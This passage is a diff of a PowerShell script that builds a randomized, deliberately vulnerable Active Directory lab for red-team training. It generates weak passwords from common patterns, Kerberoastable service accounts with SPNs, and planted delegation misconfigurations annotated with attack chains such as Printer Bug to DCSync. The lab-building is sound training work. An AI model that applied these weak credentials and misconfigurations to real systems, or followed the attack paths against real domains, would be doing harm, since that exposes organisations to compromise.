@@ -1,14 +1,27 @@
 <#
 .SYNOPSIS
-    Insta-Internal-Labinator — One-click Red Team Assumed-Breach Lab Generator
+    Insta-Internal-Labinator v3.0 — One-click Red Team Assumed-Breach Lab Generator
 .DESCRIPTION
     Deploys a fully randomized internal penetration test lab using GOAD (Game of Active Directory)
-    on VMware Workstation Pro with an attacker VM, then generates a professional Red Team Handoff Package.
+    on VMware Workstation Pro, then generates a professional Red Team Handoff Package.
+
+    v3.0 improvements over v2.0:
+      1. Deeper randomization — 200+ company names, dept-aware usernames, misconfig seed,
+         probabilistic vulnerability chains, 80-400 users with realistic password patterns
+      2. GOAD injection — clean override of domain names, CIDR, static IPs via Ansible extra-vars,
+         low-priv user creation during provisioning, GOAD-Light and MINILAB support
+      3. Handoff polish — executive-quality Handoff.md, detailed network map, complete creds file,
+         phase-by-phase attack guide, all-users CSV
+      4. Robustness — colored progress bars, idempotent re-runs, prerequisite validation with
+         actionable guidance, detailed logging, VMnet persistence check, stale-process detection
+
+    GOAD integration uses goad.py with VMware provider and Docker-based Ansible provisioning.
 .NOTES
-    Requires: Windows 11 Pro, VMware Workstation Pro, Vagrant, Git, PowerShell 5.1+
+    Requires: Windows 11 Pro, VMware Workstation Pro, Vagrant + VMware plugin, Git, Python 3,
+              Docker Desktop, PowerShell 5.1+
     Run elevated (Administrator).
     Author: Insta-Internal-Labinator Project
-    Version: 1.0.0
+    Version: 3.0.0
 #>
 
 #Requires -RunAsAdministrator
@@ -16,37 +29,60 @@
 
 [CmdletBinding()]
 param(
-    [Parameter(Mandatory = $false)]
+    [Parameter(HelpMessage = "Path to ClientHandoff.json config file")]
     [string]$ConfigPath = ".\ClientHandoff.json",
 
-    [Parameter(Mandatory = $false)]
+    [Parameter(HelpMessage = "Tear down all lab VMs")]
     [switch]$Destroy,
 
-    [Parameter(Mandatory = $false)]
+    [Parameter(HelpMessage = "Skip VMware snapshot creation")]
     [switch]$SkipSnapshots,
 
-    [Parameter(Mandatory = $false)]
-    [switch]$Force
+    [Parameter(HelpMessage = "Skip GOAD deployment (use existing VMs)")]
+    [switch]$SkipGOAD,
+
+    [Parameter(HelpMessage = "Skip attacker VM deployment")]
+    [switch]$SkipAttacker,
+
+    [Parameter(HelpMessage = "Only generate handoff package (no VMs)")]
+    [switch]$HandoffOnly,
+
+    [Parameter(HelpMessage = "Force rebuild even if VMs exist")]
+    [switch]$Force,
+
+    [Parameter(HelpMessage = "Resume provisioning from a specific playbook")]
+    [string]$ResumeFrom = "",
+
+    [Parameter(HelpMessage = "GOAD instance ID for resume operations")]
+    [string]$InstanceId = "",
+
+    [Parameter(HelpMessage = "Random seed for reproducible lab generation")]
+    [int]$MisconfigSeed = 0
 )
 
 Set-StrictMode -Version Latest
 $ErrorActionPreference = "Stop"
 $ProgressPreference = "SilentlyContinue"
 
-# ─── CONSTANTS ──────────────────────────────────────────────────────────────────
-$SCRIPT_VERSION  = "1.0.0"
+# ═══════════════════════════════════════════════════════════════════════════════
+# CONSTANTS
+# ═══════════════════════════════════════════════════════════════════════════════
+$SCRIPT_VERSION  = "3.0.0"
 $SCRIPT_DIR      = Split-Path -Parent $MyInvocation.MyCommand.Definition
 $GOAD_REPO       = "https://github.com/Orange-Cyberdefense/GOAD.git"
 $GOAD_DIR        = Join-Path $SCRIPT_DIR "GOAD"
 $LOG_DIR         = Join-Path $SCRIPT_DIR "logs"
 $LOG_FILE        = Join-Path $LOG_DIR "deploy-$(Get-Date -Format 'yyyyMMdd-HHmmss').log"
+$CUSTOM_VARS_DIR = Join-Path $SCRIPT_DIR "custom-ansible-vars"
 $VMRUN           = ""  # resolved at runtime
-$VMWARE_NETCFG   = "" # resolved at runtime
 
-# RAM budget — keep under 24 GB for 32 GB host
-$RAM_BUDGET_MB   = 24576
+# RAM budget — GOAD-Light: DC01(3GB) + DC02(3GB) + SRV02(6GB) = 12GB + Attacker(4GB) = 16GB
+$MIN_RAM_MB      = 20480   # 20 GB minimum
+$RECOMMENDED_RAM = 32768   # 32 GB recommended
 
-# ─── LOGGING ────────────────────────────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════════════════
+# LOGGING & UI
+# ═══════════════════════════════════════════════════════════════════════════════
 function Initialize-Logging {
     if (-not (Test-Path $LOG_DIR)) { New-Item -ItemType Directory -Path $LOG_DIR -Force | Out-Null }
     Start-Transcript -Path $LOG_FILE -Append -Force | Out-Null
@@ -54,204 +90,433 @@ function Initialize-Logging {
 
 function Write-Log {
     param([string]$Message, [string]$Level = "INFO")
-    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    $line = "[$ts][$Level] $Message"
+    $ts = Get-Date -Format "HH:mm:ss"
     switch ($Level) {
-        "ERROR"   { Write-Host $line -ForegroundColor Red }
-        "WARN"    { Write-Host $line -ForegroundColor Yellow }
-        "SUCCESS" { Write-Host $line -ForegroundColor Green }
-        "BANNER"  { Write-Host $line -ForegroundColor Cyan }
-        default   { Write-Host $line -ForegroundColor Gray }
+        "ERROR"   { Write-Host "  [$ts] " -NoNewline -ForegroundColor DarkGray; Write-Host "ERROR " -NoNewline -ForegroundColor Red;     Write-Host $Message -ForegroundColor Red }
+        "WARN"    { Write-Host "  [$ts] " -NoNewline -ForegroundColor DarkGray; Write-Host "WARN  " -NoNewline -ForegroundColor Yellow;  Write-Host $Message -ForegroundColor Yellow }
+        "SUCCESS" { Write-Host "  [$ts] " -NoNewline -ForegroundColor DarkGray; Write-Host "OK    " -NoNewline -ForegroundColor Green;   Write-Host $Message -ForegroundColor Green }
+        "STEP"    { Write-Host "  [$ts] " -NoNewline -ForegroundColor DarkGray; Write-Host ">>    " -NoNewline -ForegroundColor Cyan;    Write-Host $Message -ForegroundColor White }
+        "DETAIL"  { Write-Host "  [$ts] " -NoNewline -ForegroundColor DarkGray; Write-Host "      " -NoNewline;                          Write-Host $Message -ForegroundColor DarkGray }
+        default   { Write-Host "  [$ts] " -NoNewline -ForegroundColor DarkGray; Write-Host "INFO  " -NoNewline -ForegroundColor DarkCyan; Write-Host $Message -ForegroundColor Gray }
     }
 }
 
 function Write-Banner {
-    param([string]$Text)
-    $border = "=" * 80
+    param([string]$Text, [int]$Step = 0, [int]$Total = 0)
+    $prefix = if ($Step -gt 0) { "STEP $Step/$Total" } else { "" }
     Write-Host ""
-    Write-Host $border -ForegroundColor Cyan
-    Write-Host "  $Text" -ForegroundColor Cyan
-    Write-Host $border -ForegroundColor Cyan
+    Write-Host "  ┌$("─" * 74)┐" -ForegroundColor DarkCyan
+    if ($prefix) {
+        Write-Host "  │ " -NoNewline -ForegroundColor DarkCyan
+        Write-Host "$prefix — " -NoNewline -ForegroundColor Yellow
+        Write-Host "$Text".PadRight(74 - $prefix.Length - 4) -NoNewline -ForegroundColor White
+        Write-Host "│" -ForegroundColor DarkCyan
+    } else {
+        Write-Host "  │ $($Text.PadRight(73))│" -ForegroundColor Cyan
+    }
+    Write-Host "  └$("─" * 74)┘" -ForegroundColor DarkCyan
     Write-Host ""
 }
 
-# ─── RANDOMIZATION ENGINE ───────────────────────────────────────────────────────
+function Write-Progress-Bar {
+    param([string]$Activity, [int]$Percent)
+    $width = 40
+    $filled = [math]::Round($width * $Percent / 100)
+    $empty = $width - $filled
+    $bar = ("█" * $filled) + ("░" * $empty)
+    Write-Host "`r  [$bar] $Percent% $Activity" -NoNewline -ForegroundColor Cyan
+    if ($Percent -ge 100) { Write-Host "" }
+}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# RANDOMIZATION ENGINE (v3.0 — significantly expanded)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+function Initialize-RandomSeed {
+    param([int]$Seed)
+    if ($Seed -gt 0) {
+        $script:RNG = [System.Random]::new($Seed)
+        Write-Log "Misconfig seed: $Seed (reproducible generation)" "STEP"
+    } else {
+        $script:RNG = [System.Random]::new()
+        Write-Log "Misconfig seed: random (unique generation)" "STEP"
+    }
+}
+
+function Get-SeededRandom {
+    param([int]$Max, [int]$Min = 0)
+    return $script:RNG.Next($Min, $Max)
+}
 
 function Get-RandomElement {
     param([array]$Array)
-    return $Array | Get-Random
+    return $Array[(Get-SeededRandom -Max $Array.Count)]
+}
+
+# ── Company Name Pools ──────────────────────────────────────────────────────
+function New-RandomCompanyName {
+    # 80+ realistic company names across industries
+    $industries = @{
+        "Tech" = @(
+            "Apex Digital Solutions", "ByteForge Technologies", "CircuitPath Systems",
+            "DataNova Inc", "EdgePoint Software", "FusionStack Labs",
+            "GridIron Computing", "HexaByte Corporation", "InnoVault Tech",
+            "JetStream Digital", "KernelWorks LLC", "LightSpeed Dynamics",
+            "MeshPoint Networks", "NexaTech Solutions", "OptiCore Systems",
+            "PulseWave Digital", "QuantumLeap IT", "RapidScale Tech"
+        )
+        "Finance" = @(
+            "Anchor Capital Group", "Bridgewater Holdings", "Cascade Financial",
+            "Dominion Wealth Partners", "Evergreen Asset Management", "FortKnox Advisors",
+            "GoldLeaf Financial", "Harbinger Investments", "IronBridge Capital",
+            "Keystone Wealth Group", "Ledger Financial Services", "Monarch Capital"
+        )
+        "Healthcare" = @(
+            "Asclepius Health Systems", "BrightCare Medical Group", "ClearVista Health",
+            "DigiMed Solutions", "EliteCare Networks", "FirstLight Health Partners",
+            "GreenValley Medical", "HorizonCare Systems", "IntegraMed Corp"
+        )
+        "Manufacturing" = @(
+            "AlloyWorks Industries", "BoltForge Manufacturing", "CrestLine Fabrication",
+            "DeltaPrecision Corp", "Everforge Industries", "FrontierSteel LLC",
+            "GraniteEdge Manufacturing", "HardLine Industrial", "IronClad Works"
+        )
+        "Energy" = @(
+            "ArcPower Energy", "BlueFlame Resources", "ClearGrid Energy",
+            "DynamoForce Power", "EverGreen Utilities", "FluxPoint Energy",
+            "GridSync Power Systems", "HelioTech Solar", "InfiniPower Corp"
+        )
+        "Defense" = @(
+            "Aegis Defense Systems", "Bulwark Security Corp", "Citadel Strategic",
+            "DarkStar Defense", "EchelonGuard Inc", "Fortress Dynamics",
+            "Guardian Aerospace", "HawkEye Defense", "IronShield Systems"
+        )
+    }
+    $industry = Get-RandomElement @($industries.Keys)
+    return Get-RandomElement $industries[$industry]
 }
 
 function New-RandomDomain {
     $prefixes = @(
-        "acmecorp", "globexinc", "initech", "umbrellaco", "wayneindustries",
-        "starkindustries", "oscorp", "lexcorp", "cyberdyne", "massivetech",
-        "pinnacle", "silverline", "northgate", "blueridge", "crestwood",
-        "meridian", "vanguardgroup", "summitfinancial", "ironclad", "nexgenhealth",
-        "primelogistics", "atlashq", "beacontech", "corestone", "deltaforce",
-        "eaglepoint", "frontierdata", "graniteworks", "horizonit", "keystonegrp"
+        # Generic corporate
+        "acmecorp", "globexinc", "initech", "umbrellaco", "cyberdyne",
+        "massivetech", "pinnacle", "silverline", "northgate", "blueridge",
+        "crestwood", "meridian", "vanguardgrp", "summitfin", "ironclad",
+        "nexgenhealth", "primelogistics", "atlashq", "beacontech", "corestone",
+        "deltaforce", "eaglepoint", "frontierdata", "graniteworks", "horizonit",
+        # Themed / industry
+        "blackmesa", "waynetech", "starkind", "oscorptech", "lexcorp",
+        "choam", "tyrell", "weyland", "abstergo", "aperture",
+        "dharma", "encom", "gekko", "hooli", "piedpiper",
+        "raviga", "soylent", "virtucon", "wolfram", "yoyodyne",
+        # Real-sounding
+        "eastgate", "westpeak", "northstar", "southridge", "midfield",
+        "oakridge", "pinecrest", "cedarhill", "maplewood", "willowcreek",
+        "stonebridge", "brookfield", "clearwater", "deeprock", "highpoint"
     )
-    $suffixes = @(".local", ".internal", ".corp", ".lan", ".ad")
+    $suffixes = @(".local", ".internal", ".corp", ".lan", ".ad", ".intra")
     $prefix = Get-RandomElement $prefixes
     $suffix = Get-RandomElement $suffixes
     return "$prefix$suffix"
 }
 
-function New-RandomCompanyName {
-    $names = @(
-        "Acme Corporation", "Globex International", "Initech Solutions",
-        "Umbrella Holdings", "Wayne Enterprises", "Stark Industries",
-        "Oscorp Technologies", "Pinnacle Group", "Silverline Partners",
-        "Northgate Systems", "Blue Ridge Financial", "Crestwood Analytics",
-        "Meridian Health Corp", "Vanguard Group Inc", "Summit Financial",
-        "Ironclad Security", "NexGen Health Systems", "Prime Logistics",
-        "Atlas Headquarters", "Beacon Technologies", "Corestone Capital",
-        "Delta Force Defense", "Eagle Point Ventures", "Frontier Data Inc",
-        "Granite Works LLC", "Horizon IT Services", "Keystone Group"
-    )
-    return Get-RandomElement $names
-}
-
 function New-RandomCIDR {
     $cidrs = @(
         "192.168.56.0/24", "192.168.100.0/24", "192.168.50.0/24",
-        "10.10.10.0/24", "10.0.50.0/24", "10.100.100.0/24",
-        "172.16.100.0/24", "172.16.50.0/24", "172.16.200.0/24"
+        "10.10.10.0/24",   "10.0.50.0/24",     "10.100.100.0/24",
+        "172.16.100.0/24", "172.16.50.0/24",    "172.16.200.0/24",
+        "10.0.10.0/24",    "10.1.1.0/24",       "192.168.10.0/24"
     )
     return Get-RandomElement $cidrs
 }
 
+# ── Username Generation (v3.0 — department-aware patterns) ──────────────────
+
+$script:FIRST_NAMES = @(
+    "james","john","robert","michael","david","william","richard","joseph","thomas","charles",
+    "christopher","daniel","matthew","anthony","mark","donald","steven","paul","andrew","joshua",
+    "mary","patricia","jennifer","linda","barbara","elizabeth","susan","jessica","sarah","karen",
+    "lisa","nancy","betty","margaret","sandra","ashley","dorothy","kimberly","emily","donna",
+    "aiden","riley","casey","jordan","taylor","morgan","drew","blake","quinn","avery",
+    "cameron","parker","logan","reese","skyler","charlie","frankie","jamie","robin","alex"
+)
+
+$script:LAST_NAMES = @(
+    "smith","johnson","williams","brown","jones","garcia","miller","davis","wilson","moore",
+    "taylor","anderson","thomas","jackson","white","harris","martin","thompson","robinson","clark",
+    "lewis","walker","hall","allen","young","king","wright","scott","green","baker",
+    "adams","nelson","hill","campbell","mitchell","roberts","carter","phillips","evans","turner",
+    "torres","parker","collins","edwards","stewart","flores","morris","nguyen","murphy","rivera",
+    "cook","rogers","morgan","peterson","cooper","reed","bailey","bell","gomez","kelly"
+)
+
+$script:DEPARTMENTS = @(
+    @{ Name = "IT";           Titles = @("Systems Administrator","Network Engineer","Help Desk Analyst","Security Analyst","DevOps Engineer","Database Administrator","IT Manager") }
+    @{ Name = "Finance";      Titles = @("Financial Analyst","Accountant","Controller","CFO","Payroll Specialist","Auditor","Treasury Analyst") }
+    @{ Name = "HR";           Titles = @("HR Coordinator","Recruiter","Benefits Administrator","HR Manager","Talent Acquisition","HRIS Analyst") }
+    @{ Name = "Engineering";  Titles = @("Software Engineer","QA Engineer","Tech Lead","Principal Engineer","Engineering Manager","Architect") }
+    @{ Name = "Sales";        Titles = @("Account Executive","Sales Manager","BDR","Sales Director","VP Sales","Regional Manager") }
+    @{ Name = "Marketing";    Titles = @("Marketing Coordinator","Content Strategist","Brand Manager","Digital Marketing Manager","CMO") }
+    @{ Name = "Legal";        Titles = @("Corporate Counsel","Paralegal","Compliance Officer","Legal Secretary","General Counsel") }
+    @{ Name = "Operations";   Titles = @("Operations Manager","Logistics Coordinator","Facilities Manager","COO","Supply Chain Analyst") }
+    @{ Name = "Executive";    Titles = @("CEO","CTO","CFO","COO","CISO","VP Engineering","VP Operations") }
+    @{ Name = "Support";      Titles = @("Customer Support Rep","Support Engineer","Technical Writer","Support Manager","QA Analyst") }
+    @{ Name = "R&D";          Titles = @("Research Scientist","Lab Technician","R&D Manager","Principal Researcher","Data Scientist") }
+)
+
 function New-RandomUsername {
-    $patterns = @(
-        { $fnames = @("john","jane","mike","sarah","david","emma","chris","alex","pat","sam","taylor","morgan","casey","jordan","riley")
-          $lnames = @("smith","johnson","williams","brown","jones","garcia","miller","davis","wilson","moore","taylor","anderson","thomas","jackson","white")
-          $f = Get-RandomElement $fnames; $l = Get-RandomElement $lnames
-          return (Get-RandomElement @("$($f[0]).$l", "$($f[0])$l", "$f.$l", "${f}_${l}"))
-        },
-        { $svcs = @("svc_backup","svc_sql","svc_web","svc_print","svc_scan","svc_deploy","svc_monitor","svc_report")
-          return Get-RandomElement $svcs
-        },
-        { $prefix = Get-RandomElement @("temp","contractor","vendor","helpdesk","intern")
-          $year = Get-Random -Minimum 2024 -Maximum 2027
-          return "${prefix}${year}"
-        }
-    )
-    $gen = Get-RandomElement $patterns
-    return (& $gen)
+    param([string]$FirstName, [string]$LastName, [string]$Department = "")
+
+    # Pattern selection weighted by department
+    $patterns = switch ($Department) {
+        "IT"          { @("f.last","flast","first.last","first_last","adm-first","admin.first") }
+        "Executive"   { @("first.last","first_last","flast") }
+        "Engineering" { @("first.last","flast","f.last","first-last") }
+        default       { @("f.last","flast","first.last","first_last","first.l") }
+    }
+    $pattern = Get-RandomElement $patterns
+    $f = $FirstName.ToLower()
+    $l = $LastName.ToLower()
+
+    switch ($pattern) {
+        "f.last"      { return "$($f[0]).$l" }
+        "flast"       { return "$($f[0])$l" }
+        "first.last"  { return "$f.$l" }
+        "first_last"  { return "${f}_${l}" }
+        "first.l"     { return "$f.$($l[0])" }
+        "first-last"  { return "$f-$l" }
+        "adm-first"   { return "adm-$f" }
+        "admin.first" { return "admin.$f" }
+        default       { return "$($f[0]).$l" }
+    }
 }
 
 function New-RandomWeakPassword {
-    $bases = @(
-        "Password", "Welcome", "Summer", "Winter", "Spring", "Autumn",
-        "Company", "Changeme", "Letmein", "Qwerty", "Admin", "Monday",
-        "Friday", "January", "March", "P@ssw0rd"
+    param([string]$CompanyName = "")
+
+    # Season + year (most common real-world pattern)
+    $seasons = @("Spring","Summer","Autumn","Fall","Winter")
+    $months = @("January","February","March","April","May","June","July","August","September","October","November","December")
+    $years = @("2024","2025","2026","2024!","2025!","2026!","24","25","26")
+    $suffixes = @("!","1","1!","123","@1","#1","!")
+
+    # Company-based passwords
+    $companyBases = @()
+    if ($CompanyName) {
+        $shortName = ($CompanyName -split "\s" | Select-Object -First 1).ToLower()
+        $companyBases = @(
+            "${shortName}2026", "${shortName}2026!", "${shortName}123",
+            "${shortName}!", "${shortName}2025", "${shortName}1!"
+        )
+    }
+
+    # Common weak patterns
+    $commonBases = @(
+        "Password","Welcome","Changeme","Letmein","Qwerty","Admin",
+        "Monday","Friday","P@ssw0rd","Passw0rd!","Trustno1","abc123",
+        "iloveyou","dragon","master","access","login","prince","flower"
     )
-    $years = @("2024", "2025", "2026", "2025!", "2026!", "123", "1!", "!")
-    $base = Get-RandomElement $bases
-    $year = Get-RandomElement $years
-    return "$base$year"
+
+    $pools = @(
+        # Season+Year (35% — most realistic)
+        { $s = Get-RandomElement $seasons; $y = Get-RandomElement $years; "$s$y" },
+        # Month+Year (15%)
+        { $m = Get-RandomElement $months; $y = Get-RandomElement $years; "$m$y" },
+        # Common+suffix (20%)
+        { $b = Get-RandomElement $commonBases; $sf = Get-RandomElement $suffixes; "$b$sf" },
+        # Company-based (15%)
+        { if ($companyBases.Count -gt 0) { Get-RandomElement $companyBases } else { $b = Get-RandomElement $commonBases; "${b}2026!" } },
+        # Keyboard walks (10%)
+        { Get-RandomElement @("Qwerty123!","Qwert12345","1qaz2wsx","zaq1xsw2","Asdf1234!","1234Qwer!") },
+        # Simple patterns (5%)
+        { Get-RandomElement @("Welcome1!","Password1","Changeme1!","Letmein1!","Admin123!","Test1234!") }
+    )
+
+    $roll = Get-SeededRandom -Max 100
+    $idx = if ($roll -lt 35) { 0 } elseif ($roll -lt 50) { 1 } elseif ($roll -lt 70) { 2 } elseif ($roll -lt 85) { 3 } elseif ($roll -lt 95) { 4 } else { 5 }
+    return (& $pools[$idx])
 }
 
+# ── AD User Generation (v3.0 — 80-400 users, department-aware) ─────────────
+
 function New-RandomADUsers {
-    param([int]$Min = 50, [int]$Max = 300)
-    $count = Get-Random -Minimum $Min -Maximum ($Max + 1)
-    $users = @()
-    $weakRatio = (Get-Random -Minimum 15 -Maximum 35) / 100.0  # 15-35% weak passwords
-
-    $fnames = @("john","jane","mike","sarah","david","emma","chris","alex","pat","sam",
-                "taylor","morgan","casey","jordan","riley","avery","drew","cameron",
-                "parker","logan","reese","blake","quinn","skyler","charlie","frankie",
-                "jamie","robin","terry","lee","dana","kelly","jesse","tracy","gene")
-    $lnames = @("smith","johnson","williams","brown","jones","garcia","miller","davis",
-                "wilson","moore","taylor","anderson","thomas","jackson","white","harris",
-                "martin","thompson","robinson","clark","lewis","walker","hall","allen",
-                "young","king","wright","scott","green","baker","adams","nelson","hill")
-    $depts  = @("IT","Finance","HR","Engineering","Sales","Marketing","Legal","Operations","Executive","Support")
-    $titles = @("Analyst","Manager","Specialist","Coordinator","Administrator","Engineer","Director","Associate","Consultant","Technician")
-
+    param(
+        [int]$Min = 80,
+        [int]$Max = 400,
+        [string]$CompanyName = ""
+    )
+    $count = Get-SeededRandom -Min $Min -Max ($Max + 1)
+    $users = [System.Collections.ArrayList]::new()
+    $weakRatio = (Get-SeededRandom -Min 15 -Max 35) / 100.0
     $usedNames = @{}
-    for ($i = 0; $i -lt $count; $i++) {
-        $fname = Get-RandomElement $fnames
-        $lname = Get-RandomElement $lnames
-        $uname = (Get-RandomElement @("$($fname[0]).$lname", "$($fname[0])$lname", "$fname.$lname")).ToLower()
 
-        # Deduplicate
+    # Service account users (always included, 3-8)
+    $svcCount = Get-SeededRandom -Min 3 -Max 9
+    $svcPrefixes = @("svc_backup","svc_sql","svc_web","svc_print","svc_scan","svc_deploy",
+                     "svc_monitor","svc_report","svc_exchange","svc_sharepoint","svc_crm",
+                     "svc_erp","svc_antivirus","svc_patching")
+    $svcSelected = $svcPrefixes | Get-Random -Count ([math]::Min($svcCount, $svcPrefixes.Count))
+    foreach ($svc in $svcSelected) {
+        $null = $users.Add([PSCustomObject]@{
+            Username   = $svc
+            Password   = New-RandomWeakPassword -CompanyName $CompanyName
+            FirstName  = "Service"
+            LastName   = ($svc -replace "svc_","") | ForEach-Object { (Get-Culture).TextInfo.ToTitleCase($_) }
+            Department = "IT"
+            Title      = "Service Account"
+            WeakPW     = $true
+            AccountType = "Service"
+        })
+        $usedNames[$svc] = $true
+    }
+
+    # Temp/contractor accounts (2-5, always weak)
+    $tempCount = Get-SeededRandom -Min 2 -Max 6
+    $tempPrefixes = @("temp","contractor","vendor","helpdesk","intern","consultant","seasonal","remote")
+    for ($i = 0; $i -lt $tempCount; $i++) {
+        $prefix = Get-RandomElement $tempPrefixes
+        $yr = Get-SeededRandom -Min 2024 -Max 2027
+        $uname = "${prefix}${yr}"
+        if ($usedNames.ContainsKey($uname)) { $uname = "${prefix}${yr}$((Get-SeededRandom -Max 99))" }
+        $usedNames[$uname] = $true
+        $null = $users.Add([PSCustomObject]@{
+            Username   = $uname
+            Password   = New-RandomWeakPassword -CompanyName $CompanyName
+            FirstName  = (Get-Culture).TextInfo.ToTitleCase($prefix)
+            LastName   = "Account"
+            Department = Get-RandomElement @("IT","Operations","Support")
+            Title      = "Temporary Account"
+            WeakPW     = $true
+            AccountType = "Temporary"
+        })
+    }
+
+    # Admin shadow accounts (1-3)
+    $adminCount = Get-SeededRandom -Min 1 -Max 4
+    for ($i = 0; $i -lt $adminCount; $i++) {
+        $fname = Get-RandomElement $script:FIRST_NAMES
+        $lname = Get-RandomElement $script:LAST_NAMES
+        $uname = Get-RandomElement @("adm-$fname","admin.$fname","a-$($fname[0])$lname","da_$($fname[0])$lname")
+        if ($usedNames.ContainsKey($uname)) { continue }
+        $usedNames[$uname] = $true
+        $null = $users.Add([PSCustomObject]@{
+            Username   = $uname
+            Password   = New-RandomWeakPassword -CompanyName $CompanyName
+            FirstName  = (Get-Culture).TextInfo.ToTitleCase($fname)
+            LastName   = (Get-Culture).TextInfo.ToTitleCase($lname)
+            Department = "IT"
+            Title      = "IT Administrator"
+            WeakPW     = $true
+            AccountType = "Admin"
+        })
+    }
+
+    # Regular users (fill to target count)
+    $remaining = $count - $users.Count
+    for ($i = 0; $i -lt $remaining; $i++) {
+        $fname = Get-RandomElement $script:FIRST_NAMES
+        $lname = Get-RandomElement $script:LAST_NAMES
+        $dept = Get-RandomElement $script:DEPARTMENTS
+        $uname = New-RandomUsername -FirstName $fname -LastName $lname -Department $dept.Name
+
         if ($usedNames.ContainsKey($uname)) {
-            $uname = "$uname$(Get-Random -Minimum 1 -Maximum 99)"
+            $uname = "$uname$(Get-SeededRandom -Max 99)"
         }
+        if ($usedNames.ContainsKey($uname)) { continue }
         $usedNames[$uname] = $true
 
-        $isWeak = ([float](Get-Random -Minimum 0 -Maximum 100) / 100.0) -lt $weakRatio
-        $pw = if ($isWeak) { New-RandomWeakPassword } else {
-            # Strong-ish password (still crackable but not trivially guessable)
-            $chars = "abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789!@#%"
-            -join (1..14 | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] })
+        $isWeak = ((Get-SeededRandom -Max 100) / 100.0) -lt $weakRatio
+        $pw = if ($isWeak) { New-RandomWeakPassword -CompanyName $CompanyName } else {
+            $chars = "abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789!@#%^&*"
+            -join (1..14 | ForEach-Object { $chars[(Get-SeededRandom -Max $chars.Length)] })
         }
 
-        $users += [PSCustomObject]@{
+        $null = $users.Add([PSCustomObject]@{
             Username   = $uname
             Password   = $pw
             FirstName  = (Get-Culture).TextInfo.ToTitleCase($fname)
             LastName   = (Get-Culture).TextInfo.ToTitleCase($lname)
-            Department = Get-RandomElement $depts
-            Title      = Get-RandomElement $titles
+            Department = $dept.Name
+            Title      = Get-RandomElement $dept.Titles
             WeakPW     = $isWeak
-        }
+            AccountType = "Regular"
+        })
     }
-    return $users
+    return $users.ToArray()
 }
+
+# ── Service Accounts (v3.0 — with realistic SPNs) ──────────────────────────
 
 function New-RandomServiceAccounts {
     $services = @(
-        @{ Name = "svc_sqlserver";  SPN = "MSSQLSvc";    Desc = "SQL Server service account" },
-        @{ Name = "svc_http";      SPN = "HTTP";         Desc = "IIS web service account" },
-        @{ Name = "svc_backup";    SPN = "backupexec";   Desc = "Backup Exec service" },
-        @{ Name = "svc_sharepoint"; SPN = "HTTP";        Desc = "SharePoint farm account" },
-        @{ Name = "svc_exchange";  SPN = "exchangeMDB";  Desc = "Exchange mailbox service" },
-        @{ Name = "svc_scanner";   SPN = "vncscan";      Desc = "Vulnerability scanner service" }
+        @{ Name="svc_sqlserver";  SPN="MSSQLSvc/srv02.{domain}:1433";    Desc="SQL Server service account"; DelegationType="none" }
+        @{ Name="svc_http";       SPN="HTTP/intranet.{domain}";          Desc="IIS web service account";    DelegationType="constrained" }
+        @{ Name="svc_backup";     SPN="backupexec/srv02.{domain}";       Desc="Backup Exec service";        DelegationType="none" }
+        @{ Name="svc_sharepoint"; SPN="HTTP/sharepoint.{domain}";        Desc="SharePoint farm account";    DelegationType="constrained" }
+        @{ Name="svc_exchange";   SPN="exchangeMDB/mail.{domain}";       Desc="Exchange mailbox service";   DelegationType="unconstrained" }
+        @{ Name="svc_scanner";    SPN="HOST/scanner.{domain}";           Desc="Vulnerability scanner svc";  DelegationType="none" }
+        @{ Name="svc_crm";        SPN="HTTP/crm.{domain}";              Desc="CRM application service";    DelegationType="none" }
+        @{ Name="svc_sccm";      SPN="HTTP/sccm.{domain}";              Desc="SCCM site server account";   DelegationType="constrained" }
     )
-    $count = Get-Random -Minimum 2 -Maximum ($services.Count + 1)
+    $count = Get-SeededRandom -Min 3 -Max ($services.Count + 1)
     $selected = $services | Get-Random -Count $count
     foreach ($svc in $selected) {
-        $svc["Password"] = New-RandomWeakPassword  # Kerberoastable!
+        $svc["Password"] = New-RandomWeakPassword
     }
     return $selected
 }
 
+# ── Misconfiguration Engine (v3.0 — probability chains, seed-aware) ────────
+
 function New-RandomMisconfigurations {
-    # Return a seed object that describes which misconfigs to inject
     $misconfigs = @(
-        @{ Id = "UNCONSTRAINED_DELEG"; Description = "Unconstrained delegation on a server"; Probability = 0.8 },
-        @{ Id = "CONSTRAINED_DELEG";   Description = "Constrained delegation to DC"; Probability = 0.6 },
-        @{ Id = "ASREP_ROAST";         Description = "AS-REP roastable accounts (no preauth)"; Probability = 0.9 },
-        @{ Id = "KERBEROAST";          Description = "Kerberoastable service accounts with weak passwords"; Probability = 0.95 },
-        @{ Id = "GPP_PASSWORDS";       Description = "Group Policy Preferences with stored credentials"; Probability = 0.7 },
-        @{ Id = "LAPS_MISSING";        Description = "LAPS not deployed on workstations"; Probability = 0.6 },
-        @{ Id = "SMB_SIGNING_OFF";     Description = "SMB signing not required"; Probability = 0.75 },
-        @{ Id = "LLMNR_ENABLED";       Description = "LLMNR/NBT-NS enabled"; Probability = 0.85 },
-        @{ Id = "DCSYNC_PATH";         Description = "ACL path to DCSync via group nesting"; Probability = 0.5 },
-        @{ Id = "WEAK_ACL";            Description = "GenericAll/WriteDACL on privileged objects"; Probability = 0.7 },
-        @{ Id = "PRINTSPOOLER";        Description = "Print Spooler service running on DC"; Probability = 0.8 },
-        @{ Id = "ADCS_ESC1";           Description = "ADCS misconfigured template (ESC1)"; Probability = 0.4 }
+        @{ Id="UNCONSTRAINED_DELEG"; Category="Delegation";    Desc="Unconstrained delegation on a server";                  Prob=0.80; Severity="Critical"; AttackPath="Printer Bug → TGT capture → DCSync" }
+        @{ Id="CONSTRAINED_DELEG";   Category="Delegation";    Desc="Constrained delegation to CIFS/LDAP on DC";             Prob=0.60; Severity="High";     AttackPath="S4U2Self → S4U2Proxy → impersonate DA" }
+        @{ Id="RBCD";                Category="Delegation";    Desc="Resource-based constrained delegation writable";         Prob=0.45; Severity="High";     AttackPath="Write msDS-AllowedToActOnBehalfOfOtherIdentity" }
